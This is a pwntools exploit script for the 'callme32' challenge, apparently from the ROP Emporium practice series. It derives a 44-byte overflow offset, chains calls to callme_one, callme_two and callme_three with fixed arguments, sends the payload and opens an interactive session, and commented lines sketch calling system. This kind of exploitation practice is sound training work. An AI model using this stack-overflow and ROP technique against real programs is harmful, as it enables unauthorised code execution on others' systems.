import sys

from pwn import *

# Many built-in settings can be controlled via CLI and show up in "args"
# For example, to dump all data sent/received, and disable ASLR
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    # Start the exploit against the target
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)


# Specify your GDB script here for debugging
gdbscript = '''
# break
# b *0x0804874e
continue
'''.format(**locals())

# Set up pwntools for the correct architecture
exe = './callme32'
# This will automatically get context arch, bits, os etc
elf = context.binary = ELF(exe, checksec=False)
# Enable verbose logging so we can see exactly what is being sent (info/debug)
context.log_level = 'debug'
# Delete core files after finished
# context.delete_corefiles = True

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================

if False:
    io = start()
    io.sendlineafter('> ', cyclic(400, n=4))

    io.wait_for_close()
    core =io.corefile

    print(core.sp)
    print(core.sp)
    print(core.sp)
    print(core.sp)
    print(hex(core.sp))
    print(core.read(core.sp, 4))
    info("-----------------------")
    info("%s", cyclic_find(core.read(core.sp, 4), n=4))
    info("-----------------------")

    sys.exit()

offset=44


# binsh_offset = next(elf.search(b'/bin/cat'))

rop = ROP(elf)
params = [0xdeadbeef, 0xcafebabe, 0xd00df00d, ]
rop.call(elf.plt.callme_one,   params)
rop.call(elf.plt.callme_two,   params)
rop.call(elf.plt.callme_three, params)

# rop.call(elf.plt.system, [0xf7f280f5, ])

info("%s", rop.dump())
# sys.exit()

PAYLOAD = flat({
    offset: [
        # b'AAAA'
      # rop.find_gadget(['ret']).address,  # ropper --file ./ret2win --search 'ret'
      # rop.find_gadget(['ret']).address,  # ropper --file ./ret2win --search 'ret'
      rop.chain()
    ]
})


io = start()
io.sendlineafter(b'>', PAYLOAD)
# io.clean()
io.interactive()
# io.wait_for_close()
